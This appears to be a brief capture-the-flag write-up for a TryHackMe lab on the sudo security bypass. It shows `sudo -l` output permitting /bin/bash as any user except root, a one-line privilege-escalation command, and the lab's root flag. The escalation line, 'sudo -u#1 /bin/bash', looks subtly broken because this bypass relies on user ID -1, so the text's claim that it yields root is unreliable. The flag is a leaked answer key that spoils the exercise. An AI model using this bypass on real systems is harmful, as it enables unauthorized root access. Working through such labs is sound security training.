# Machine NAME : Sudo Security Bypass
# Machine IP : 10.10.153.192

***TASK 1: Deploy!***

***TASK 2: Secuiry Bypass***
```
1.What command are you allowed to run with sudo? 
/bin/bash 

2.What is the flag in /root/root.txt? 
- following this : 
    tryhackme@sudo-privesc:/bin$ sudo -l 
    Matching Defaults entries for tryhackme on sudo-privesc: 
    env_reset, mail_badpass, 

    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/ 
    bin\:/sbin\:/bin\:/snap/bin 
    
    User tryhackme may run the following commands on sudo-privesc: 
    &nbsp;&nbsp;(ALL, !root) NOPASSWD: /bin/bash 
```

***Privilage Escalate Command this !*** <br>
```
&nbsp; sudo -u#1 /bin/bash

root flag : THM{l33t_s3cur1ty_bypass}
```